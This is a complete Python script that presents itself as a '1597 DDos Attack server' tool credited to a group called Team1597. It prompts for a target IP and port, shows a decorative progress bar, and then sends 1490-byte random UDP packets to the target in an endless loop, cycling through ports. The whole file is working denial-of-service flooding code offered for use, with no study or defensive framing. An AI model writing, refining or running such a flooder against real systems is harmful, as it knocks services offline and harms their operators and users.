import sys
import os
import time
import socket
import random
from datetime import datetime
from termcolor import colored

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("cls")
print(colored("1597 DDos Attack server", "cyan"))
print(colored("Author   : Team1597", "green"))
print(colored("Owned by : Efendina", "yellow"))
print(colored("github   : Efendina", "red"))
print(colored("https://t.me/Taem_1597"))
print()
ip = input(colored("IP List  : ", "blue"))
port = int(input(colored("Port       : ", "blue")))

os.system("cls")
print(colored("Attack Starting", "cyan"))
print(colored("[                    ] 0% ", "green"))
time.sleep(5)
print(colored("[=====               ] 25%", "red"))
time.sleep(5)
print(colored("[==========          ] 50%", "green"))
time.sleep(5)
print(colored("[===============     ] 75%", "yellow"))
time.sleep(5)
print(colored("[====================] 100%", "blue"))
time.sleep(3)
sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent = sent + 1
    port = port + 1
    print(colored("Sent %s packet to %s throught port:%s" % (sent, ip, port), random.choice(["red", "green", "yellow", "blue", "magenta", "cyan"])))
    if port == 65534:
        port = 1
